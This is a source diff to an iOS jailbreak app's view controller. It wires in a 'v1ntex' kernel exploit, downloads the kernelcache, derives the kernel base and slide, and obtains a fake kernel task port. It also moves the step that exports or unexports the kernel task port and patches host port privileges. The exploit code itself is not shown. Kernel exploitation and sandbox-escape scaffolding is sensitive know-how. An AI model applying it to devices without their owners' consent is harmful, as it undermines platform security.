@@ -31,6 +31,7 @@
 #include <reboot.h>
 #import <snappy.h>
 #import <inject.h>
+#include <libgrabkernel/libgrabkernel.h>
 #import "JailbreakViewController.h"
 #include "KernelStructureOffsets.h"
 #include "empty_list_sploit.h"
@@ -52,6 +53,8 @@
 #include "kernel_memory.h"
 #include "kernel_slide.h"
 #include "find_port.h"
+#include "v1ntex_offsets.h"
+#include "v1ntex_exploit.h"
 
 @interface NSUserDefaults ()
 - (id)objectForKey:(id)arg1 inDomain:(id)arg2;
@@ -191,6 +194,7 @@ struct mockfs_fsnode_struct {
 };
 
 static NSString *bundledResources = nil;
+static mach_port_t host = MACH_PORT_NULL;
 
 // https://github.com/JonathanSeals/kernelversionhacker/blob/3dcbf59f316047a34737f393ff946175164bf03f/kernelversionhacker.c#L92
 
@@ -645,7 +649,7 @@ out:
 #define IKOT_HOST_PRIV 4
 
 void make_host_into_host_priv() {
-    uint64_t hostport_addr = get_address_of_port(getpid(), mach_host_self());
+    uint64_t hostport_addr = get_address_of_port(getpid(), host);
     uint32_t old = ReadKernel32(hostport_addr);
     LOG("old host type: 0x%08x", old);
     if ((old & (IO_ACTIVE | IKOT_HOST_PRIV)) != (IO_ACTIVE | IKOT_HOST_PRIV))
@@ -653,7 +657,7 @@ void make_host_into_host_priv() {
 }
 
 void make_host_priv_into_host() {
-    uint64_t hostport_addr = get_address_of_port(getpid(), mach_host_self());
+    uint64_t hostport_addr = get_address_of_port(getpid(), host);
     uint32_t old = ReadKernel32(hostport_addr);
     LOG("old host type: 0x%08x", old);
     if ((old & (IO_ACTIVE | IKOT_HOST)) != (IO_ACTIVE | IKOT_HOST))
@@ -732,6 +736,14 @@ void show_vnode(uint64_t vp) {
         printf("%02x", *(((unsigned char*)&vnode)+i));
     }
     printf("\n");
+}
+
+kern_return_t v1ntex_callback(task_t kernel_task, kptr_t kbase, void *data) {
+    prepare_for_rw_with_fake_tfp0(kernel_task);
+    offsets_init();
+    kernel_base = kbase;
+    kernel_slide = (kernel_base - KERNEL_SEARCH_ADDRESS);
+    return KERN_SUCCESS;
 }
 
 void jailbreak()
@@ -845,6 +857,36 @@ void jailbreak()
                     }
                     break;
                 }
+                case v1ntex_exploit: {
+                    const char *kernelCacheDownloadPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"kernel"].UTF8String;
+                    const char *kernelCachePath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kernel"].UTF8String;
+                    const char *originalKernelCachePath = "/System/Library/Caches/com.apple.kernelcaches/kernelcache";
+                    if (canRead(originalKernelCachePath)) {
+                        kernelCachePath = originalKernelCachePath;
+                        LOG("Found kernelcache in filesystem.");
+                    } else if (canRead(kernelCachePath)) {
+                        LOG("Found kernelcache in documents.");
+                    } else {
+                        LOG("Downloading kernelcache from Apple...");
+                        NOTICE(NSLocalizedString(@"Downloading kernelcache from Apple. This may take a while.", nil), false, false);
+                        _assert(clean_file(kernelCacheDownloadPath), message, true);
+                        _assert(clean_file(kernelCachePath), message, true);
+                        _assert(grabkernel((char *)kernelCacheDownloadPath) == ERR_SUCCESS, message, true);
+                        _assert(copyfile(kernelCacheDownloadPath, kernelCachePath, 0, COPYFILE_ALL) == ERR_SUCCESS, message, true);
+                        _assert(clean_file(kernelCacheDownloadPath), message, true);
+                        LOG("Successfully downloaded kernelcache from Apple.");
+                    }
+                    v1ntex_offsets *v1ntex_offs = NULL;
+                    v1ntex_offs = get_v1ntex_offsets(kernelCachePath);
+                    _assert(v1ntex_offs != NULL, message, true);
+                    if (v1ntex(v1ntex_callback, NULL, v1ntex_offs) == ERR_SUCCESS &&
+                        MACH_PORT_VALID(tfp0) &&
+                        ISADDR(kernel_base) &&
+                        ISADDR(kernel_slide)) {
+                        exploit_success = true;
+                    }
+                    break;
+                }
                 default: {
                     NOTICE(NSLocalizedString(@"No exploit selected", nil), false, false);
                     STATUS(NSLocalizedString(@"Jailbreak", nil), true, true);
@@ -920,26 +962,6 @@ void jailbreak()
     UPSTAGE();
     
     {
-        if (prefs.export_kernel_task_port) {
-            // Export kernel task port.
-            LOG("Exporting kernel task port...");
-            SETMESSAGE(NSLocalizedString(@"Failed to export kernel task port.", nil));
-            make_host_into_host_priv();
-            LOG("Successfully exported kernel task port.");
-            INSERTSTATUS(NSLocalizedString(@"Exported kernel task port.\n", nil));
-        } else {
-            // Unexport kernel task port.
-            LOG("Unexporting kernel task port...");
-            SETMESSAGE(NSLocalizedString(@"Failed to unexport kernel task port.", nil));
-            make_host_priv_into_host();
-            LOG("Successfully unexported kernel task port.");
-            INSERTSTATUS(NSLocalizedString(@"Unexported kernel task port.\n", nil));
-        }
-    }
-    
-    UPSTAGE();
-    
-    {
         // Escape Sandbox.
         static uint64_t ShenanigansPatch = 0xca13feba37be;
         
@@ -974,6 +996,26 @@ void jailbreak()
         remap_tfp0_set_hsp4(&tfp0);
         LOG("Successfully set HSP4 as TFP0.");
         INSERTSTATUS(NSLocalizedString(@"Set HSP4 as TFP0.\n", nil));
+    }
+    
+    UPSTAGE();
+    
+    {
+        if (prefs.export_kernel_task_port) {
+            // Export kernel task port.
+            LOG("Exporting kernel task port...");
+            SETMESSAGE(NSLocalizedString(@"Failed to export kernel task port.", nil));
+            make_host_into_host_priv();
+            LOG("Successfully exported kernel task port.");
+            INSERTSTATUS(NSLocalizedString(@"Exported kernel task port.\n", nil));
+        } else {
+            // Unexport kernel task port.
+            LOG("Unexporting kernel task port...");
+            SETMESSAGE(NSLocalizedString(@"Failed to unexport kernel task port.", nil));
+            make_host_priv_into_host();
+            LOG("Successfully unexported kernel task port.");
+            INSERTSTATUS(NSLocalizedString(@"Unexported kernel task port.\n", nil));
+        }
     }
     
     UPSTAGE();
@@ -2083,6 +2125,7 @@ out:
 
 - (void)viewDidLoad {
     [super viewDidLoad];
+    host = mach_host_self();
     _canExit = YES;
     // Do any additional setup after loading the view, typically from a nib.
     if ([[NSUserDefaults standardUserDefaults] boolForKey:K_HIDE_LOG_WINDOW]) {
